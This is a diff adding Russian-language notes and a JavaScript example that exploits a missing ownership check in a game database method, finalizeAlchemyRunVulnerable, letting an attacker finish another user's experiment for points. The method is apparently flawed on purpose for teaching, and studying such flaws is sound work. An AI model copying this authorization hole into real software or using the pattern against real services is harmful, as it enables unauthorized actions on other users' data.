@@ -64,3 +64,23 @@ try {
 } catch (err) {
   console.error('Ошибка:', err.message);
 }
+# Уяза в finalizeAlchemyRunVulnerable – финализация чужого алхимического эксперимента
+Проблема: нет проверки, что runId принадлежит пользователю _userId. Злоумышленник может подставить любой _userId (например, свой) и завершить чужой эксперимент
+Пример эксплуатации 
+import Db from './db.js';
+
+const db = new Db('./game.db');
+
+// Злоумышленник Мэллори (его ID)
+const malloryId = 999;
+// Он узнал ID чужого алхимического эксперимента (например, Алисы) – 12345
+const aliceRunId = 12345;
+
+try {
+  // Вызов с _userId = свой, но runId – чужой
+  const result = db.finalizeAlchemyRunVulnerable(malloryId, aliceRunId, "Malory's artifact note");
+  console.log('Чужой эксперимент завершён:', result);
+  // Мэллори получает достижение и +90 очков в игру "alchemy"
+} catch (err) {
+  console.error('Ошибка:', err.message);
+}
